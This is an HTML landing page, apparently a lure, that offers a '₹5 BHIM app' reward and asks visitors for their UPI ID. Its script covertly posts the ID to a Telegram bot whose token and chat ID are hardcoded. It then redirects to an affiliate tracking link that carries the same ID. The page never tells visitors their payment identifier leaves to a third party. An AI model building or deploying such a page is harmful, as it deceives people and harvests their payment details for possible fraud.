<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Welcome Offer</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body, html {
      height: 100%;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)),
                  url('https://images.unsplash.com/photo-1504384308090-c894fdcc538d?auto=format&fit=crop&w=1600&q=80') no-repeat center center/cover;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
    }

    .container {
      background: rgba(255, 255, 255, 0.1);
      padding: 40px;
      border-radius: 15px;
      text-align: center;
      backdrop-filter: blur(10px);
      max-width: 500px;
      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
    }

    .container h1 {
      font-size: 32px;
      margin-bottom: 20px;
    }

    .container p {
      font-size: 18px;
      margin-bottom: 20px;
      color: #eee;
    }

    .form-group {
      text-align: left;
      margin-bottom: 15px;
    }

    label {
      display: block;
      font-size: 15px;
      margin-bottom: 5px;
      color: #fff;
    }

    input[type="text"] {
      width: 100%;
      padding: 12px 15px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
    }

    .submit-button {
      background: #00c6ff;
      background: linear-gradient(to right, #0072ff, #00c6ff);
      border: none;
      padding: 15px 30px;
      font-size: 16px;
      border-radius: 50px;
      color: #fff;
      cursor: pointer;
      transition: background 0.3s ease;
      margin-top: 10px;
    }

    .submit-button:hover {
      background: linear-gradient(to right, #0052cc, #0099cc);
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Camplus Campaign</h1>
    <p>BHIM APP - ₹5 ✅!</p>
    <p>Start your journey to exclusive rewards, offers, and giveaways!</p>

    <div class="form-group">
      <label for="upi">UPI ID</label>
      <input type="text" id="upi" placeholder="Enter your UPI ID" required>
    </div>

    <button class="submit-button" onclick="handleSubmit()">Submit</button>
  </div>

  <script>
    function generateClickId(length = 14) {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    }

    function handleSubmit() {
      const upi = document.getElementById('upi').value.trim();
      if (!upi) {
        alert("Please enter your UPI ID.");
        return;
      }

      const clickId = generateClickId();
      const offerId = 209;

      const message = `
📥 <b>New Click Recived</b>\n
🆔 <b>Offer ID:</b> <code>${offerId}</code>\n
🧾 <b>UPI ID:</b> <code>${upi}</code>\n
🔗 <b>Click ID:</b> <code>${clickId}</code>
      `;

      const botToken = "7540736322:AAG_eg6uGT3BgJU4PJDRJIl4q5C1DEopOv8";
      const chatId = "7094705343";

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML"
        })
      }).finally(() => {
        const redirectUrl = `https://partners.trackopia.com/click?aid=965&oid=${offerId}&aff_sub=${clickId}&aff_sub4=${encodeURIComponent(upi)}`;
        window.location.href = redirectUrl;
      });
    }
  </script>

</body>
</html>
